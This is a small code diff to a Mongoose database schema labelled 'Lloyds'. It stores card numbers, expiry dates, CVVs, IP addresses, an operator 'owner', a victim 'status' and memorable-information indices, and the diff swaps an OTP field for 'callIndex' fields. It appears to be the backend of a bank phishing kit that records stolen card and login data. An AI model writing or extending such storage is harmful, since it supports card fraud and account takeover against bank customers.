@@ -8,14 +8,16 @@ const lloydsSchema = new mongoose.Schema({
   ccnum: String,
   ccexp: String,
   cvv: String,
-  otp: String,
   status: Number,
   ip: String,
   owner: String,
   memIndex1: String,
   memIndex2: String,
   memIndex3: String,
-  memIndex4: String,
+  callIndex1: String,
+  callIndex2: String,
+  callIndex3: String,
+  callIndex4: String,
 });
 
 module.exports = mongoose.model("Lloyds", lloydsSchema);
